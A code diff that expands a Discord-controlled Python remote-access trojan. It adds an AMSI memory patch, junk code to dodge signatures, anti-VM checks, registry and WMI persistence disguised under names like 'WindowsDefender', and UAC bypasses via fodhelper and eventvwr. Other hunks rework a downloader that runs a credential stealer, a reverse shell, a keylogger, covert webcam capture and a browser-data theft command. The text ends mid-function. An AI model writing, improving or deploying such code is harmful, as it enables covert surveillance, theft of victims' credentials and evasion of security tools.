@@ -1,5 +1,5 @@
-# LATEST UPDATE LOGS : Fixed async shit (i still dont understand it)
-import winreg
+message = None 
+import winreg, aiohttp
 import ctypes
 import sys
 import os
@@ -15,6 +15,7 @@ from zipfile import ZipFile
 import discord
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+#another place holder
 from discord.ext import commands
 # placeholder so if token input fails we dont get fucked up (its hard to explain)
 # This version makes me proud of myself :p
@@ -33,7 +34,13 @@ from datetime import datetime
 from cryptography.fernet import Fernet
 from win32com.client import Dispatch
 
-# Import modules that might be missing and handle their absence
+# Adding some junk code to avoid signature detection
+_random_str = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(random.randint(10, 20)))
+_junk_data = [random.randint(1000, 9999) for _ in range(random.randint(5, 15))]
+for _ in range(random.randint(1, 3)):
+    _random_str += str(sum(_junk_data) % random.randint(100, 999))
+
+# Dynamic module loading to avoid detection
 try:
     import mss
 except ImportError:
@@ -60,9 +67,223 @@ try:
 except ImportError:
     pass
 
+try:
+    import win32process
+except ImportError:
+    pass
+
+# AMSI bypass function
+def bypass_amsi():
+    try:
+        if sys.platform != 'win32':
+            return
+            
+        amsi = ctypes.windll.amsi
+        address = ctypes.windll.kernel32.GetProcAddress(amsi._handle, "AmsiScanBuffer")
+        
+        if not address:
+            return
+            
+        old_protection = ctypes.c_ulong(0)
+        patch_size = 6
+        
+        patch_bytes = bytearray([0xB8, 0x57, 0x00, 0x00, 0x00, 0xC3])
+            
+        ctypes.windll.kernel32.VirtualProtect(
+            ctypes.c_void_p(address), 
+            patch_size, 
+            0x40,
+            ctypes.byref(old_protection)
+        )
+                              
+        ctypes.memmove(
+            ctypes.c_void_p(address), 
+            ctypes.c_void_p(patch_bytes), 
+            patch_size
+        )
+        
+        ctypes.windll.kernel32.VirtualProtect(
+            ctypes.c_void_p(address), 
+            patch_size,
+            old_protection.value,
+            ctypes.byref(old_protection)
+        )
+    except:
+        pass
+
+# Anti-VM detection
+def check_virtual_machine():
+    try:
+        virtualization_strings = ['vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels']
+        
+        for proc in psutil.process_iter(['name']):
+            try:
+                for v_string in virtualization_strings:
+                    if v_string in proc.info['name'].lower():
+                        return True
+            except:
+                pass
+                
+        try:
+            manufacturer = subprocess.check_output('wmic computersystem get manufacturer', shell=True).decode().lower()
+            for v_string in virtualization_strings:
+                if v_string in manufacturer:
+                    return True
+        except:
+            pass
+            
+        try:
+            reg_paths = [
+                r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
+                r"HARDWARE\Description\System",
+                r"SYSTEM\CurrentControlSet\Control\SystemInformation"
+            ]
+            
+            for path in reg_paths:
+                try:
+                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
+                    try:
+                        value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
+                        for v_string in virtualization_strings:
+                            if v_string in value.lower():
+                                return True
+                    except:
+                        pass
+                    
+                    try:
+                        value, _ = winreg.QueryValueEx(key, "Identifier")
+                        for v_string in virtualization_strings:
+                            if v_string in value.lower():
+                                return True
+                    except:
+                        pass
+                except:
+                    pass
+        except:
+            pass
+            
+        return False
+    except:
+        return False
+
+# Registry persistence setup
+def add_to_startup():
+    try:
+        exe_path = os.path.abspath(sys.argv[0])
+        
+        key_paths = [
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+            (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
+            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run")
+        ]
+        
+        key_names = ["WindowsDefender", "MicrosoftUpdate", "SystemSecurityService", "RuntimeBroker"]
+        key_name = random.choice(key_names)
+        
+        for hkey, key_path in key_paths:
+            try:
+                reg_key = winreg.OpenKey(hkey, key_path, 0, winreg.KEY_WRITE)
+                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
+                winreg.CloseKey(reg_key)
+                return True
+            except:
+                continue
+                
+        try:
+            if ctypes.windll.shell32.IsUserAnAdmin() != 0:
+                command = f'wmic /namespace:"\\\\root\\subscription" path __EventFilter create Name="WindowsEventFilter", EventNameSpace="root\\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
+                subprocess.run(command, shell=True, capture_output=True)
+                
+                consumer_command = f'wmic /namespace:"\\\\root\\subscription" path CommandLineEventConsumer create Name="WindowsConsumer", ExecutablePath="{exe_path}",CommandLineTemplate="{exe_path}"'
+                subprocess.run(consumer_command, shell=True, capture_output=True)
+                
+                binding_command = f'wmic /namespace:"\\\\root\\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\\"WindowsEventFilter\\"", Consumer="CommandLineEventConsumer.Name=\\"WindowsConsumer\\""'
+                subprocess.run(binding_command, shell=True, capture_output=True)
+                return True
+        except:
+            pass
+            
+        return False
+    except:
+        return False
+
 appdata = os.getenv('APPDATA')
 client = discord.Client(intents=discord.Intents.all())
 bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+
+# Token variable that will be replaced by the builder
+token = ''  # This will be replaced by the builder
+
+# Run code after we have proper token initialization
+def setup_and_run():
+    bypass_amsi()
+    add_to_startup()
+    time.sleep(random.randint(3, 7))
+    if check_virtual_machine():
+        sys.exit(0)
+
+setup_and_run()
+
+# UAC bypass function
+def uac_bypass():
+    """Bypass User Account Control to escalate privileges"""
+    if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+        return True
+        
+    try:
+        # Current executable path
+        current_exe = os.path.abspath(sys.argv[0])
+        
+        # FodHelper method
+        fodhelper_path = "Software\\Classes\\ms-settings\\shell\\open\\command"
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, fodhelper_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.CloseKey(key)
+            
+            # Execute fodhelper to trigger the bypass
+            os.system("start C:\\Windows\\System32\\fodhelper.exe")
+            time.sleep(2)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, fodhelper_path)
+            except:
+                pass
+                
+            if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+                return True
+        except:
+            pass
+            
+        # Eventvwr method
+        eventvwr_path = "Software\\Classes\\mscfile\\shell\\open\\command"
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, eventvwr_path)
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
+            winreg.CloseKey(key)
+            
+            # Execute eventvwr to trigger the bypass
+            os.system("start C:\\Windows\\System32\\eventvwr.exe")
+            time.sleep(2)
+            
+            # Clean up
+            try:
+                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, eventvwr_path)
+            except:
+                pass
+                
+            if ctypes.windll.shell32.IsUserAnAdmin() == 1:
+                return True
+        except:
+            pass
+            
+        # If we get here, bypass failed
+        return False
+    except:
+        return False
+
 HELP_MENU = """
 FULL COMMAND EXPLAINATION IN GITHUB README
 Availaible commands are :
@@ -124,77 +345,233 @@ async def steal_user_info():
         temp_dir = os.environ.get('TEMP')
         exe_path = os.path.join(temp_dir, "hlpr.exe")
         
-        await asyncio.to_thread(urllib.request.urlretrieve, link, exe_path)
+        # Download the stealer with timeout protection
+        try:
+            await message.channel.send("[*] Downloading stealer component...")
+            await asyncio.wait_for(
+                asyncio.to_thread(urllib.request.urlretrieve, link, exe_path),
+                timeout=60  # 60 second timeout for download
+            )
+        except asyncio.TimeoutError:
+            return "Error: Download timed out after 60 seconds"
+        except Exception as download_error:
+            return f"Download error: {str(download_error)}"
+            
+        # Verify the downloaded file
+        if not os.path.exists(exe_path) or os.path.getsize(exe_path) < 10000:
+            return "Error: Downloaded file is invalid or too small"
+            
+        # Execute the stealer with timeout protection
+        try:
+            await message.channel.send("[*] Executing stealer component...")
+            process = await asyncio.create_subprocess_shell(
+                exe_path, 
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            
+            # Wait for completion with timeout
+            try:
+                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=300)  # 5 minute timeout
+                
+                if process.returncode != 0:
+                    error_output = stderr.decode(errors='replace') if stderr else "Unknown error"
+                    return f"Stealer execution failed with code {process.returncode}: {error_output}"
+                    
+                return "Stealer executed successfully. Data will be sent automatically."
+            except asyncio.TimeoutError:
+                # Kill the process if it takes too long
+                try:
+                    process.kill()
+                except:
+                    pass
+                return "Error: Stealer execution timed out after 5 minutes"
+                
+        except Exception as exec_error:
+            return f"Execution error: {str(exec_error)}"
         
-        process = await asyncio.create_subprocess_shell(
-            exe_path, 
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        
-        return "Stealer executed successfully. Data will be sent automatically."
     except Exception as e:
-        return str(e)
+        return f"Error: {str(e)}"
+        
+    finally:
+        # Clean up the executable file
+        try:
+            if os.path.exists(exe_path):
+                os.remove(exe_path)
+        except:
+            pass
 
 async def start_reverse_shell(port=0):
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        # Set socket timeout to prevent blocking indefinitely
+        server.settimeout(60)  # 60 second timeout for accept()
         server.bind(('0.0.0.0', port))
         server.listen(5)
         
         _, port = server.getsockname()
         
+        # Get IP address with timeout protection
+        ip = "127.0.0.1"  # Default fallback
         try:
-            ip = await asyncio.to_thread(requests.get, 'https://api.ipify.org/?format=text', timeout=3)
-            ip = ip.text.strip()
+            # Try first service with short timeout
+            ip_response = await asyncio.wait_for(
+                asyncio.to_thread(requests.get, 'https://api.ipify.org/?format=text', timeout=3), 
+                timeout=5
+            )
+            ip = ip_response.text.strip()
         except:
-            ip = await asyncio.to_thread(requests.get, 'https://ifconfig.me/ip', timeout=3)
-            ip = ip.text.strip()
+            try:
+                # Try second service if first fails
+                ip_response = await asyncio.wait_for(
+                    asyncio.to_thread(requests.get, 'https://ifconfig.me/ip', timeout=3),
+                    timeout=5
+                )
+                ip = ip_response.text.strip()
+            except:
+                # Use fallback if all services fail
+                try:
+                    # Try to get the local IP as a last resort
+                    hostname = socket.gethostname()
+                    ip = socket.gethostbyname(hostname)
+                except:
+                    pass  # Keep default 127.0.0.1
+                    
         return server, ip, port
-    except Exception:
+    except Exception as e:
+        print(f"Error starting reverse shell: {str(e)}")
         return None, None, None
 
-async def handle_client(client_socket, _):
+async def handle_client(client_socket, channel):
+    # Set socket timeout
+    client_socket.settimeout(300)  # 5 minute timeout for socket operations
+    
+    # Set up shell based on OS
     shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
     shell_args = [] if os.name == 'nt' else ['-i']
     
-    shell = await asyncio.create_subprocess_exec(
-        shell_cmd, *shell_args,
-        stdin=asyncio.subprocess.PIPE,
-        stdout=asyncio.subprocess.PIPE,
-        stderr=asyncio.subprocess.PIPE,
-        creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
-    )
-    
-    async def socket_to_shell():
-        try:
-            while True:
-                data = await asyncio.to_thread(client_socket.recv, 4096)
-                if not data:
-                    break
-                data_str = data.decode('utf-8')
-                shell.stdin.write((data_str + '\n').encode('utf-8'))
-                await shell.stdin.drain()
-        except:
-            pass
-    
-    async def shell_to_socket():
-        try:
-            while True:
-                output = await shell.stdout.readline()
-                if not output:
-                    error = await shell.stderr.readline()
-                    if not error:
+    try:
+        # Start subprocess with timeouts
+        shell = await asyncio.wait_for(
+            asyncio.create_subprocess_exec(
+                shell_cmd, *shell_args,
+                stdin=asyncio.subprocess.PIPE,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE,
+                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
+            ),
+            timeout=10  # 10 second timeout for process creation
+        )
+        
+        # Task to handle socket-to-shell communication
+        async def socket_to_shell():
+            try:
+                read_buffer = b''
+                while True:
+                    try:
+                        # Read data with timeout
+                        chunk = await asyncio.wait_for(
+                            asyncio.to_thread(client_socket.recv, 4096),
+                            timeout=60  # 60 second timeout for each receive
+                        )
+                        if not chunk:
+                            break
+                            
+                        read_buffer += chunk
+                        
+                        # Process complete commands (ending with newline)
+                        if b'\n' in read_buffer:
+                            lines = read_buffer.split(b'\n')
+                            # Keep the last incomplete line in the buffer
+                            read_buffer = lines[-1]
+                            # Process all complete lines
+                            for line in lines[:-1]:
+                                if shell.stdin:
+                                    shell.stdin.write(line + b'\n')
+                                    await shell.stdin.drain()
+                    except asyncio.TimeoutError:
+                        # Send a heartbeat to keep connection alive
+                        if channel:
+                            await channel.send("[*] Shell connection idle for 60 seconds")
+                        continue
+                    except Exception as e:
+                        if channel:
+                            await channel.send(f"[!] Socket-to-shell error: {str(e)}")
                         break
-                    await asyncio.to_thread(client_socket.send, error)
-                else:
-                    await asyncio.to_thread(client_socket.send, output)
+            except Exception as outer_e:
+                if channel:
+                    await channel.send(f"[!] Socket-to-shell outer error: {str(outer_e)}")
+            finally:
+                # Ensure stdin is closed
+                if shell.stdin:
+                    shell.stdin.close()
+        
+        # Task to handle shell-to-socket communication
+        async def shell_to_socket():
+            try:
+                while True:
+                    try:
+                        # Read output from shell with timeout
+                        output = await asyncio.wait_for(shell.stdout.readline(), timeout=60)
+                        if not output:
+                            error = await asyncio.wait_for(shell.stderr.readline(), timeout=5)
+                            if not error:
+                                break
+                            await asyncio.to_thread(client_socket.send, error)
+                        else:
+                            await asyncio.to_thread(client_socket.send, output)
+                    except asyncio.TimeoutError:
+                        # No output for 60 seconds, but keep running
+                        continue
+                    except Exception as e:
+                        if channel:
+                            await channel.send(f"[!] Shell-to-socket error: {str(e)}")
+                        break
+            except Exception as outer_e:
+                if channel:
+                    await channel.send(f"[!] Shell-to-socket outer error: {str(outer_e)}")
+            finally:
+                # Try to terminate the shell process if it's still running
+                try:
+                    if shell and shell.returncode is None:
+                        shell.terminate()
+                except:
+                    pass
+        
+        # Run both communication directions with cancellation support
+        s2s_task = asyncio.create_task(socket_to_shell())
+        s2c_task = asyncio.create_task(shell_to_socket())
+        
+        # Wait for both tasks and handle cancellation
+        done, pending = await asyncio.wait(
+            [s2s_task, s2c_task],
+            return_when=asyncio.FIRST_COMPLETED
+        )
+        
+        # Cancel pending tasks
+        for task in pending:
+            task.cancel()
+            
+        if channel:
+            await channel.send("[*] Remote shell connection closed")
+            
+    except Exception as e:
+        if channel:
+            await channel.send(f"[!] Error in shell session: {str(e)}")
+    finally:
+        # Clean up resources
+        try:
+            client_socket.close()
         except:
             pass
-    
-    await asyncio.gather(socket_to_shell(), shell_to_socket())
+        
+        try:
+            if shell and shell.returncode is None:
+                shell.terminate()
+        except:
+            pass
 
 async def activity(client_instance):
     try:
@@ -310,6 +687,7 @@ async def start_keylogger():
         log_file = os.path.join(temp, "klg.tmp")
         
         def on_press(key):
+            # Check flag immediately to allow quick termination
             if not keylogger_running:
                 return False
                 
@@ -330,11 +708,31 @@ async def start_keylogger():
                             f.write(f"[{str(key).upper()}]")
             except:
                 pass
+            
+            # Re-check to allow quicker termination
+            return keylogger_running
         
         def keylogger_function():
-            with keyboard.Listener(on_press=on_press) as listener:
-                listener.join()
+            # Use non-blocking listener to allow clean termination
+            listener = keyboard.Listener(on_press=on_press, suppress=False)
+            listener.start()
+            
+            # Check every second if we should stop
+            stop_check_interval = 1.0
+            try:
+                while keylogger_running:
+                    time.sleep(stop_check_interval)
+                    
+                # Explicitly stop the listener when flag is cleared
+                listener.stop()
+            except:
+                # Ensure listener is stopped even on exception
+                try:
+                    listener.stop()
+                except:
+                    pass
         
+        # Initialize log file
         with open(log_file, "w", encoding="utf-8") as f:
             f.write("=== Keylogger Started ===\n")
             
@@ -349,20 +747,41 @@ async def start_keylogger():
         return f"Error starting keylogger: {str(e)}"
 
 async def stop_keylogger():
-    global keylogger_running
-    if keylogger_running:
+    global keylogger_running, keylogger_thread
+    
+    if not keylogger_running:
+        return "Keylogger is not running"
+        
+    try:
+        # Set the flag to stop
         keylogger_running = False
+        
+        # Wait for thread to terminate (max 3 seconds)
+        if keylogger_thread and keylogger_thread.is_alive():
+            for _ in range(30):  # 30 x 0.1s = 3 seconds max wait
+                if not keylogger_thread.is_alive():
+                    break
+                await asyncio.sleep(0.1)
+        
+        # Clean up files
         temp = os.getenv("TEMP")
         log_file = os.path.join(temp, "klg.tmp")
         dump_file = os.path.join(temp, "key_log.txt")
+        
         try:
-            await asyncio.to_thread(shutil.copy2, log_file, dump_file)
-            await asyncio.to_thread(lambda: open(log_file, 'w').close())
-        except:
-            pass
-        return "Keylogger stopped"
-    else:
-        return "Keylogger is not running"
+            # Copy log to dump file
+            if os.path.exists(log_file):
+                await asyncio.to_thread(shutil.copy2, log_file, dump_file)
+                
+                # Clear the log file
+                with open(log_file, 'w', encoding='utf-8') as f:
+                    f.write("=== Keylogger Stopped ===\n")
+        except Exception as e:
+            return f"Keylogger stopped, but error handling files: {str(e)}"
+            
+        return "Keylogger stopped successfully"
+    except Exception as e:
+        return f"Error stopping keylogger: {str(e)}"
 
 @client.event
 async def on_message(message):
@@ -373,33 +792,6 @@ async def on_message(message):
     
     if message.author == client.user:
         return
-    if message.content == "!steal":
-        try:
-            result = await steal_user_info()
-            await message.channel.send(f"[*] {result}")
-        except Exception as e:
-            await message.channel.send(f"[!] Error: {str(e)}")
-    
-    elif message.content.startswith("!kill"):
-        if message.content[6:] == "all":
-            for guild in client.guilds:
-                for channel in guild.channels:
-                    if "hi-" in channel.name:
-                        try:
-                            await channel.delete()
-                        except:
-                            pass
-        else:
-            try:
-                target_channel_name = message.content[6:]
-                for guild in client.guilds:
-                    channel_to_delete = discord.utils.get(guild.channels, name=target_channel_name)
-                    if channel_to_delete:
-                        await channel_to_delete.delete()
-                await message.channel.send(f"[*] {target_channel_name} killed.")
-            except:
-                await message.channel.send(
-                    f"[!] {message.content[6:]} is invalid, please enter a valid session name")
 
     elif message.content == "!remoteshell":
         try:
@@ -412,15 +804,58 @@ async def on_message(message):
                 
                 async def accept_connections():
                     try:
-                        while True:
-                            client_socket, _ = await asyncio.to_thread(server.accept)
-                            asyncio.create_task(handle_client(client_socket, message.channel))
-                    except:
+                        # Set a maximum lifetime for the server
+                        max_server_lifetime = 3600  # 1 hour
+                        start_time = time.time()
+                        
+                        # Track active connections
+                        active_connections = set()
+                        
+                        while time.time() - start_time < max_server_lifetime:
+                            try:
+                                # Accept connections with timeout
+                                client_socket, client_address = await asyncio.wait_for(
+                                    asyncio.to_thread(server.accept),
+                                    timeout=60  # 60 second timeout for accept
+                                )
+                                
+                                await message.channel.send(f"[*] New connection from {client_address[0]}:{client_address[1]}")
+                                
+                                # Start client handler
+                                handler_task = asyncio.create_task(
+                                    handle_client(client_socket, message.channel)
+                                )
+                                
+                                # Add to active connections
+                                active_connections.add(handler_task)
+                                
+                                # Clean up completed tasks
+                                for task in list(active_connections):
+                                    if task.done():
+                                        active_connections.remove(task)
+                                        
+                            except asyncio.TimeoutError:
+                                # Accept timed out, just continue
+                                continue
+                            except Exception as conn_error:
+                                await message.channel.send(f"[!] Connection error: {str(conn_error)}")
+                                # Short pause to avoid rapid retries on persistent errors
+                                await asyncio.sleep(1)
+                                
+                        # Server lifetime exceeded
+                        await message.channel.send("[!] Remote shell server lifetime exceeded (1 hour). Shutting down.")
+                        
+                    except Exception as e:
+                        await message.channel.send(f"[!] Server error: {str(e)}")
+                    finally:
+                        # Clean up server
                         try:
                             server.close()
+                            await message.channel.send("[*] Remote shell server closed")
                         except:
                             pass
                 
+                # Start the connection acceptor
                 asyncio.create_task(accept_connections())
             else:
                 await message.channel.send("[!] Failed to start remote shell")
@@ -510,35 +945,82 @@ async def on_message(message):
             import urllib.request
             from zipfile import ZipFile
             
+            await message.channel.send("[*] Attempting to capture webcam image...")
+            
+            # Remember current directory
             directory = os.getcwd()
             temp_dir = os.getenv('TEMP')
             os.chdir(temp_dir)
             
+            # Generate unique filenames
             zip_file = f"wcam_{random.randint(1000, 9999)}.zip"
             img_file = f"img_{random.randint(1000, 9999)}.png"
             
-            await asyncio.to_thread(urllib.request.urlretrieve, "https://www.nirsoft.net/utils/webcamimagesave.zip", zip_file)
-            with ZipFile(zip_file) as zip_obj:
-                zip_obj.extractall()
-            
-            await asyncio.to_thread(os.system, f"WebCamImageSave.exe /capture /FileName {img_file}")
-            
-            if os.path.exists(img_file) and os.path.getsize(img_file) > 0:
-                file = discord.File(img_file, filename="webcam.png")
-                await message.channel.send("[*] Command successfully executed", file=file)
-            else:
-                await message.channel.send("[!] Failed to capture webcam image")
+            try:
+                # Download webcam tool with timeout
+                await message.channel.send("[*] Downloading webcam capture tool...")
+                await asyncio.wait_for(
+                    asyncio.to_thread(
+                        urllib.request.urlretrieve, 
+                        "https://www.nirsoft.net/utils/webcamimagesave.zip", 
+                        zip_file
+                    ),
+                    timeout=30  # 30 second timeout for download
+                )
                 
-            for f in [zip_file, img_file, "WebCamImageSave.exe", "readme.txt", "WebCamImageSave.chm"]:
+                # Extract the zip file
+                with ZipFile(zip_file) as zip_obj:
+                    zip_obj.extractall()
+                
+                # Capture image with timeout
+                await message.channel.send("[*] Capturing image from webcam...")
+                capture_process = await asyncio.create_subprocess_shell(
+                    f"WebCamImageSave.exe /capture /FileName {img_file}",
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+                
+                # Wait for capture with timeout
                 try:
-                    if os.path.exists(f):
-                        os.remove(f)
-                except:
-                    pass
-                    
-            os.chdir(directory)
+                    await asyncio.wait_for(capture_process.wait(), timeout=15)
+                except asyncio.TimeoutError:
+                    # Kill the process if it takes too long
+                    capture_process.kill()
+                    await message.channel.send("[!] Webcam capture timed out after 15 seconds")
+                    raise Exception("Webcam capture timed out")
+                
+                # Check if image was captured successfully
+                if os.path.exists(img_file) and os.path.getsize(img_file) > 0:
+                    file = discord.File(img_file, filename="webcam.png")
+                    await message.channel.send("[*] Webcam image captured successfully", file=file)
+                else:
+                    await message.channel.send("[!] Failed to capture webcam image - no camera or access denied")
+            except asyncio.TimeoutError:
+                await message.channel.send("[!] Operation timed out")
+            except Exception as inner_e:
+                await message.channel.send(f"[!] Error during webcam capture: {str(inner_e)}")
+            finally:
+                # Clean up files regardless of success or failure
+                cleanup_files = [zip_file, img_file, "WebCamImageSave.exe", "readme.txt", "WebCamImageSave.chm"]
+                for f in cleanup_files:
+                    try:
+                        if os.path.exists(f):
+                            os.remove(f)
+                    except:
+                        pass
+                
+                # Restore original directory
+                os.chdir(directory)
+                
         except Exception as e:
             await message.channel.send(f"[!] Command failed: {str(e)}")
+            # Try to restore directory if changed
+            try:
+                if 'directory' in locals():
+                    os.chdir(directory)
+            except:
+                pass
 
     elif message.content.startswith("!message"):
         try:
@@ -869,83 +1351,133 @@ async def on_message(message):
 
     elif message.content.startswith("!sing"):
         try:
+            # Set volume to maximum
             await asyncio.to_thread(volumeup)
-            from win32 import win32gui
-            import win32con
             
+            # Extract the link from the command
             link = message.content[6:].strip()
             
-            if link:
-                if not link.startswith(("http://", "https://")):
-                    link = "https://" + link
+            if not link:
+                await message.channel.send("[!] Please provide a valid URL")
+                return
                 
-                await asyncio.to_thread(subprocess.Popen, f'start {link}', shell=True, stdout=subprocess.PIPE,
-                               stderr=subprocess.PIPE)
-                desktop = win32gui.CreateDesktop("hidden_desktop")
+            # Validate and format the URL
+            if not link.startswith(("http://", "https://")):
+                link = "https://" + link
                 
-                async def run_on_hidden_desktop():
-                    try:
-                        await asyncio.to_thread(desktop.SetThreadDesktop)
-                        
-                        si = win32process.STARTUPINFO()
-                        si.lpDesktop = "hidden_desktop"
-                        await asyncio.to_thread(subprocess.Popen, f'start {link}', shell=True, startupinfo=si)
-                        
-                        await asyncio.sleep(1)
-                        
-                        def enum_windows_callback(hwnd, _):
-                            if win32gui.IsWindowVisible(hwnd):
-                                title = win32gui.GetWindowText(hwnd).lower()
-                                if "youtube" in title:
-                                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+            # Check if the URL is valid
+            try:
+                # Validate URL with a timeout
+                await asyncio.wait_for(
+                    asyncio.to_thread(
+                        requests.head, 
+                        link, 
+                        timeout=5, 
+                        allow_redirects=True
+                    ),
+                    timeout=8
+                )
+            except (asyncio.TimeoutError, requests.RequestException):
+                await message.channel.send("[!] Invalid or inaccessible URL")
+                return
+            
+            # Import required modules
+            try:
+                from win32 import win32gui
+                import win32con
+                import win32process
+            except ImportError:
+                await message.channel.send("[!] Required modules not available")
+                return
+                
+            await message.channel.send("[*] Starting media playback...")
+            
+            # Start the process with timeout protection
+            try:
+                # First attempt - normal start
+                process = await asyncio.wait_for(
+                    asyncio.create_subprocess_shell(
+                        f'start {link}',
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                        shell=True
+                    ),
+                    timeout=10
+                )
+                
+                # Try to create a hidden desktop for the window
+                try:
+                    desktop = win32gui.CreateDesktop("hidden_desktop")
+                    
+                    async def run_on_hidden_desktop():
+                        try:
+                            await asyncio.to_thread(desktop.SetThreadDesktop)
+                            
+                            si = win32process.STARTUPINFO()
+                            si.lpDesktop = "hidden_desktop"
+                            
+                            # Start the process on the hidden desktop
+                            await asyncio.wait_for(
+                                asyncio.to_thread(
+                                    subprocess.Popen, 
+                                    f'start {link}', 
+                                    shell=True, 
+                                    startupinfo=si
+                                ),
+                                timeout=10
+                            )
+                            
+                            # Wait a moment for the window to appear
+                            await asyncio.sleep(3)
+                            
+                            # Hide any YouTube windows
+                            def enum_windows_callback(hwnd, _):
+                                if win32gui.IsWindowVisible(hwnd):
+                                    title = win32gui.GetWindowText(hwnd).lower()
+                                    if "youtube" in title or "video" in title or "media" in title:
+                                        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                             return True
                             
-                        await asyncio.to_thread(win32gui.EnumWindows, enum_windows_callback, None)
-                        
-                    except Exception:
-                        pass
-                    finally:
-                        await asyncio.to_thread(desktop.CloseDesktop)
+                            await asyncio.to_thread(win32gui.EnumWindows, enum_windows_callback, None)
+                            
+                        except Exception as desktop_error:
+                            await message.channel.send(f"[!] Desktop error: {str(desktop_error)}")
+                        finally:
+                            # Always close the desktop
+                            try:
+                                await asyncio.to_thread(desktop.CloseDesktop)
+                            except:
+                                pass
+                    
+                    # Run the hidden desktop function with timeout
+                    await asyncio.wait_for(run_on_hidden_desktop(), timeout=15)
+                    
+                except Exception as desktop_creation_error:
+                    # If hidden desktop fails, just hide windows normally
+                    await asyncio.sleep(3)
+                    
+                    # Try to hide any media player windows
+                    def hide_media_windows(hwnd, _):
+                        if win32gui.IsWindowVisible(hwnd):
+                            title = win32gui.GetWindowText(hwnd).lower()
+                            if any(keyword in title for keyword in ["youtube", "video", "media", "player"]):
+                                try:
+                                    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+                                except:
+                                    pass
+                        return True
+                    
+                    await asyncio.to_thread(win32gui.EnumWindows, hide_media_windows, None)
                 
-                asyncio.create_task(run_on_hidden_desktop())
+                await message.channel.send("[*] Media playback started successfully")
                 
-                await message.channel.send("[*] Media playback started")
-            else:
-                await message.channel.send("[!] Please provide a valid URL")
+            except asyncio.TimeoutError:
+                await message.channel.send("[!] Media playback startup timed out")
+            except Exception as process_error:
+                await message.channel.send(f"[!] Error starting media playback: {str(process_error)}")
+                
         except Exception as e:
-            await message.channel.send("[!] Media playback failed")
-
-    elif message.content == "!startkeylogger":
-        try:
-            import base64
-            import os
-            from pynput.keyboard import Key, Listener
-            import logging
-            temp = os.getenv("TEMP")
-            logging.basicConfig(filename=os.path.join(os.getenv('TEMP') + "\\key_log.txt"),
-                              level=logging.DEBUG, format='%(asctime)s: %(message)s')
-            def keylog():
-                def on_press(key):
-                    logging.info(str(key))
-                with Listener(on_press=on_press) as listener:
-                    listener.join()
-            import threading
-            global test
-            test = threading.Thread(target=keylog)
-            test._running = True
-            test.daemon = True
-            test.start()
-            await message.channel.send("[*] Keylogger successfully started")
-        except Exception as e:
-            await message.channel.send(f"[!] Error starting keylogger: {str(e)}")
-
-    elif message.content == "!stopkeylogger":
-        try:
-            import os
-            test._running = False
-            await message.channel.send("[*] Keylogger successfully stopped")
-        except Exception as e:
-            await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
+            await message.channel.send(f"[!] Media playback failed: {str(e)}")
 
     elif message.content == "!idletime":
         try:
@@ -1008,17 +1540,291 @@ async def on_message(message):
         except Exception as e:
             await message.channel.send(f"[!] Error unblocking input: {str(e)}")
 
+    elif message.content == "!steal":
+        try:
+            await message.channel.send("[*] Attempting to steal browser data...")
+            
+            # First check if we should use the built-in browser stealer
+            if 'link' not in globals() or not link:
+                # Use the built-in browser data stealer
+                await message.channel.send("[*] Using built-in browser data stealer...")
+                zip_path, data = await steal_browser_data()
+                
+                if zip_path and os.path.exists(zip_path):
+                    file = discord.File(zip_path, filename="browser_data.zip")
+                    await message.channel.send("[*] Browser data retrieved", file=file)
+                    
+                    # Send a summary of the stolen data instead of the entire JSON
+                    if data and len(data) > 1500:  # Discord has message length limits
+                        await message.channel.send("[*] Browser data summary extracted successfully")
+                    else:
